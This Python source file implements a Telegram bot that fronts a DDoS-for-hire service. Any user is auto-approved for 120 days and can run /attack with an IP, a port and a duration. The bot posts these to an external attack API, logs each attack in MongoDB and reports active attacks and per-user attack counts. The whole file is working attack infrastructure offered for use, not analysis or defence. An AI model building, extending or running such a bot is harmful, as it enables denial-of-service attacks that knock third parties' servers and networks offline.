import asyncio
import logging
import subprocess
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from bson import ObjectId
import re
from functools import wraps
import html
import uuid
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

# --- CONFIGURATION ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535
AUTO_APPROVE_DAYS = 120  # User will be approved for 120 days automatically

# Helper functions for time
def make_aware(dt):
    if dt is None: return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# MongoDB Connection Class
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        
        # Create indexes
        self.users.create_index([("user_id", ASCENDING)], unique=True)
        self.attacks.create_index([("timestamp", DESCENDING)])

    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            user["created_at"] = make_aware(user.get("created_at"))
            user["expires_at"] = make_aware(user.get("expires_at"))
        return user
    
    def auto_approve_user(self, user_id: int, username: str = None) -> Dict:
        """Automatically creates/updates user with 120 days access"""
        expires_at = get_current_time() + timedelta(days=AUTO_APPROVE_DAYS)
        
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": True,
            "approved_at": get_current_time(),
            "expires_at": expires_at,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        
        # Update if exists, insert if not
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {
                "username": username,
                "approved": True,
                "expires_at": expires_at,
                "approved_at": get_current_time()
            }, "$setOnInsert": {"total_attacks": 0, "created_at": get_current_time(), "is_banned": False}},
            upsert=True
        )
        return self.get_user(user_id)

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "timestamp": get_current_time()
        }
        self.attacks.insert_one(attack_data)
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

    def get_all_users(self):
        return list(self.users.find())

# Initialize database
db = Database()

# API Functions
def launch_attack(ip: str, port: int, duration: int) -> Dict:
    try:
        response = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=15
        )
        return response.json()
    except Exception as e:
        return {"error": str(e), "success": False}

def check_running_attacks():
    try:
        response = requests.get(f"{API_URL}/api/v1/active", headers={"x-api-key": API_KEY}, timeout=10)
        return response.json()
    except: return {"success": False}

# Permission Check
async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"): return False
    expires_at = make_aware(user.get("expires_at"))
    return expires_at > get_current_time()

# --- COMMAND HANDLERS ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    # AUTO APPROVAL LOGIC
    user = db.auto_approve_user(user_id, username)
    
    message = (
        f"✅ **Account Auto-Approved!**\n\n"
        f"Hello @{username or user_id}, welcome to the Attack Bot.\n"
        f"Your account has been activated for **{AUTO_APPROVE_DAYS} days**.\n\n"
        f"🚀 **Available Commands:**\n"
        f"🔹 `/attack <ip> <port> <time>` - Launch Attack\n"
        f"🔹 `/myinfo` - View account details\n"
        f"🔹 `/mystats` - View your stats\n"
        f"🔹 `/help` - Show all commands\n\n"
        f"📅 **Expiry:** {user['expires_at'].strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    await update.message.reply_text(message, parse_mode="Markdown")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        # Re-approve if expired
        db.auto_approve_user(user_id, update.effective_user.username)

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: `/attack <ip> <port> <duration>`", parse_mode="Markdown")
        return

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])

    if port in BLOCKED_PORTS:
        await update.message.reply_text(f"❌ Port {port} is blocked!")
        return

    status_msg = await update.message.reply_text("🚀 Launching Attack... Please wait.")
    response = launch_attack(ip, port, duration)

    if response.get("success"):
        db.log_attack(user_id, ip, port, duration, "success")
        await status_msg.edit_text(f"✅ **Attack Sent!**\n\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}s`", parse_mode="Markdown")
    else:
        db.log_attack(user_id, ip, port, duration, "failed")
        await status_msg.edit_text(f"❌ **Failed:** {response.get('error', 'Unknown Error')}")

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user: return
    
    msg = (
        f"👤 **User Info**\n"
        f"🆔 ID: `{user['user_id']}`\n"
        f"✅ Status: `Approved` (Auto)\n"
        f"📊 Total Attacks: `{user['total_attacks']}`\n"
        f"📅 Expiry: `{user['expires_at'].strftime('%Y-%m-%d')}`"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    total = db.attacks.count_documents({"user_id": user_id})
    success = db.attacks.count_documents({"user_id": user_id, "status": "success"})
    
    await update.message.reply_text(f"📊 **Your Stats**\n\nTotal Attacks: {total}\nSuccessful: {success}", parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🤖 **Bot Help Menu**\n\n"
        "/start - Activate account (120 days)\n"
        "/attack <ip> <port> <time> - Start attack\n"
        "/myinfo - Check account info\n"
        "/mystats - Check your stats\n"
        "/myattacks - Check active attacks"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = check_running_attacks()
    if data.get("success") and data.get("activeAttacks"):
        msg = "🎯 **Active Attacks:**\n" + "\n".join([f"🔹 {a['target']}:{a['port']} ({a['expiresIn']}s)" for a in data['activeAttacks']])
    else:
        msg = "✅ No active attacks found."
    await update.message.reply_text(msg, parse_mode="Markdown")

# Admin commands
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS: return
    users = db.get_all_users()
    await update.message.reply_text(f"👥 Total Users in DB: {len(users)}")

def main():
    print("🤖 Bot is starting with AUTO-APPROVE (120 Days)...")
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("mystats", mystats_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("myattacks", myattacks_command))
    app.add_handler(CommandHandler("users", users_command))

    app.run_polling()

if __name__ == "__main__":
    main()
